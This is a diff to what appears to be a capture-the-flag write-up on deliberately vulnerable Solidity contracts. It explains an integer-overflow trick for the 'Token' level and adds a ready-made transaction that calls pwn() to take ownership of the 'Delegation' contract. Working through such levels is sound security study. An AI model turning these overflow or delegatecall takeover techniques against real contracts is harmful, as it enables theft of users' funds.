@@ -14,3 +14,5 @@ Token:
 Here we exploit the fact that in Solidity versions before 0.7.0, overflows weren't checked (you had to use SafeMath as an import), so we can overflow the balance check function to make it possible to transfer tokens we don't own to ourselves
 
 Delegation:
+This is solved with the following call to the Delegation contract:
+sendTransaction({"from": "0xDd704A44866AE9C387CfC687fa642a222b84f0D3", "to": "0x7aB95d0ACfc5E5e0B2F64dE9DCe48975716937A9", "data": web3.eth.abi.encodeFunctionSignature('pwn()')})
